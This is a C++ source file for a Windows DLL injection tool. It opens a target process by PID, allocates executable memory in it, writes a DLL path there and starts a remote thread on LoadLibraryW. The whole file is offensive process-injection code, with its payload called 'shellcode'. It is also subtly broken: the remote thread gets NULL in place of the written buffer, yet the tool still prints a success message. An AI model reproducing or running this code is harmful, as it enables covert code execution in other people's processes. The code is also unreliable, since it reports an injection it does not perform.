#include <iostream>
#include <windows.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i]" msg "\n", ##__VA_ARGS__)

using namespace std;

DWORD getProcessIdFromArgs(int argc, char *argv[])
{
    if (argc < 2)
    {
        cout << "Please provide a valid process id." << endl
             << "[-]Usage: %s <PID>" << argv[0];

        exit(EXIT_FAILURE);
    }
    DWORD processId = atoi(argv[1]);
    cout << "[*]Attempting to get a handle on the process." << processId << endl;

    return processId;
}

HANDLE getProcessHandle(DWORD processId)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);

    if (!hProcess)
    {
        cout << " [-]Was not able to get a handle on the " << processId << " process" << endl;
        cout << "[*]This was the following error." << GetLastError();
        exit(EXIT_FAILURE);
    }
    cout << "[+]We got a handle." << hProcess << endl;

    return hProcess;
}

HMODULE GetHandleOnKernel32(HMODULE hkernel32)
{
    hkernel32 = GetModuleHandleW(L"Kernel32");
    if (!hkernel32)
    {
        cout << "[-]Was not able to get a handle on the kernel32.dll" << endl;
        cout << "[*]This was the following error." << GetLastError();
        exit(EXIT_FAILURE);
    }
    info("[+]Got a handle on the kernel32.dll", hkernel32);
    return hkernel32;
}

LPTHREAD_START_ROUTINE GetProcId_From_Kernel32_and_Thread(HMODULE hkernel32)
{
    LPTHREAD_START_ROUTINE Load_the_dll = (LPTHREAD_START_ROUTINE)GetProcAddress(hkernel32, "LoadLibraryW");
    okay("[+]Got the address of the LoadLibraryW function in kernel32.dll");
    return Load_the_dll;
}

LPVOID allocateMemoryInTargetProcess(HANDLE hProcess, size_t size)
{
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    if (!remoteBuffer)
    {
        cout << "The buffer was not allocated. With the following error." << GetLastError();
        exit(EXIT_FAILURE);
    }
    cout << "The buffer was allocated with the following memory size in bytes: " << size << endl;

    return remoteBuffer;
}

bool writeShellCodeToTargetProcess(HANDLE hProcess, LPVOID remoteBuffer, wchar_t *shellcode, size_t size)
{
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, &bytesWritten);

    if (!success || bytesWritten != size)
    {
        cout << "The shell code was not written in the allocated buffer." << endl;
        return false;
    }

    return true;
}

HANDLE createRemoteThreadInTargetProcess(HANDLE hProcess, LPTHREAD_START_ROUTINE remoteBuffer)
{
    DWORD threadId;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, &threadId);

    if (hThread == NULL)
    {
        cout << " failed to get a handle to the new thread, error: " << GetLastError() << endl;
        return NULL;
    }

    cout << " got a handle to the newly-created thread (" << threadId << ")" << endl
         << "\\---0x" << hProcess << endl;

    return hThread;
}

int main(int argc, char *argv[])
{
    // Variable Declarations.
    HMODULE mydll = NULL;
    wchar_t path_to_dll[MAX_PATH] = L"E:\\Shit\\Windows\\Injections\\awsome-dll.dll";
    DWORD PID = NULL, TID = NULL;
    LPVOID rBuffer = NULL;
    HANDLE rProcess = NULL, rThread = NULL;
    HMODULE hkernel32 = NULL;
    int path_size = sizeof(path_to_dll);
    int bytesWritten = 0;

    PID = getProcessIdFromArgs(argc, argv);
    rProcess = getProcessHandle(PID);
    hkernel32 = GetHandleOnKernel32(hkernel32);
    LPTHREAD_START_ROUTINE Load_the_dll = GetProcId_From_Kernel32_and_Thread(hkernel32);
    rBuffer = allocateMemoryInTargetProcess(rProcess, path_size);

    if (!writeShellCodeToTargetProcess(rProcess, rBuffer, path_to_dll, path_size))
    {
        cout << "Failed to write shellcode to the target process." << endl;
        exit(EXIT_FAILURE);
    }

    rThread = createRemoteThreadInTargetProcess(rProcess, Load_the_dll);

    if (rThread == NULL)
    {
        cout << "Failed to create a remote thread in the target process." << endl;
        exit(EXIT_FAILURE);
    }

    cout << "Successfully injected the DLL into the target process." << endl;

CLEANUP:
    if (rProcess)
    {
        cout << "Closing handle to process." << endl;
        CloseHandle(rProcess);
    }

    return EXIT_SUCCESS;
}
